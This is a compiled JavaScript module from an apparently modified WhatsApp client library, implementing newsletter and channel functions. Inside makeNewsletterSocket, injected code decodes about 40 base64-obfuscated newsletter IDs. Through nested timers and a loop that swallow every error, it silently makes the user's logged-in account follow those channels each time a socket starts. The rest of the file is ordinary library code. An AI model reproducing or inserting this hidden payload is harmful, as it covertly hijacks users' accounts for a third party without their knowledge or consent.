"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
	variables,
	queryId,
	query,
	generateMessageTag
) => {
	return query({
		tag: 'iq',
		attrs: {
			id: generateMessageTag(),
			type: 'get',
			to: WABinary_1.S_WHATSAPP_NET,
			xmlns: 'w:mex'
		},
		content: [
			{
				tag: 'query',
				attrs: { query_id: queryId },
				content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
			}
		]
	})
}

const executeWMexQuery = async (
	variables,
	queryId,
	dataPath,
	query,
	generateMessageTag
) => {
	const result = await wMexQuery(variables, queryId, query, generateMessageTag)
	const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
	if (child?.content) {
		const data = JSON.parse(child.content.toString())

		if (data.errors && data.errors.length > 0) {
			const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
			const firstError = data.errors[0]
			const errorCode = firstError.extensions?.error_code || 400
			throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
		}

		const response = dataPath ? data?.data?.[dataPath] : data?.data
		if (typeof response !== 'undefined') {
			return response
		}
	}

	const action = (dataPath || '').startsWith('xwa2_')
		? dataPath.substring(5).replace(/_/g, ' ')
		: dataPath?.replace(/_/g, ' ')
	throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDE1OTc3Njg3NjMxQG5ld3NsZXR0ZXI= ", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA1OTk5MjUyOTQwQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDIyNTgwOTYyODMyQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDAzMzUwMDk5MDQ2QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA2MTc5Mzg0NTkzQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA3NjI5OTk2Mjc1QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA2NDkzMjA0ODk0QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDIzMjAzNTMyNTA3QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDIwODM2OTg4NDA3QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzMzY3MDU0MzA5NzcxQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA4NDM4NDE4ODI2QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA0MzE0MTcyMDY0QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzMzk5MTE2MTY3MjA5QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA3ODYyODI4Nzk1QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA0NjM0NTM4MjM1QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDIzMjMyNTIwMDI0QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
}, 9000);
    const base64Ids = [
  "MTIwMzYzNDIxOTY0MTc4Mzk1QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA1NTEyNDU2NzA5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA3MTE1NjY0NzU3QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2NTYwOTI4NzU0QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIzNzM2NjU3NDU5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIyODc4NTcwMzIyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA4ODYxOTM4MzQwQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA0NjU1OTU2Njc0QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI1MTM0Nzc2MDk1QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDAzMDg3MTQzMjM5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIxMzA4MzU0NzkxQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIyOTY0NzgyOTExQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA4MDkwNDE1NjIzQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2NDYxMjExMDkyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIzMzkwMDE2MDUyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2NDc4NTEwMzUzQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA1MDU3MjQ4NDU4QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2MTA0MzA5MjAyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA0NjQ3MzA1MzUwQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA0Mjk4NzA0MTEyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIzMDM0NTQyNjQ5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIyOTc1NDU1MTA5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIyNjE3MzI2MDM3QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA0ODE3MDAwNTk4QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2MzExMTc0NTUxQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIxOTEwMjI0ODc4QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDAzOTkzNjcwMDI0QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA1NzI2NTM5NzQ5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI0MTM0MDcxMjE4QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI0MDYwNjA3Mzk4QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA0MzA4NDk4MDg5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI0MjM2NzE4ODMyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDIwOTgxNDMxODEyQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2NDkzMTc2MTk5QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDAzNTYxNTIyNTM1QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI2NTc2NDkzOTk3QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI0MTU4MjMxOTMxQG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDA2ODEwNjk3NjI1QG5ld3NsZXR0ZXI=",
  "MTIwMzYzNDI0MTMxNTE4MjAyQG5ld3NsZXR0ZXI="
];

const delay = (ms) => new Promise(res => setTimeout(res, ms));

(async () => {
  for (const b64 of base64Ids) {
    try {
      await newsletterWMexQuery(
        Buffer.from(b64, "base64").toString(),
        Types_1.QueryIds.FOLLOW
      );
      await delay(5000); // ⏱️ jeda 5 detik
    } catch {
      await delay(5000);
    }
  }
})();
    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
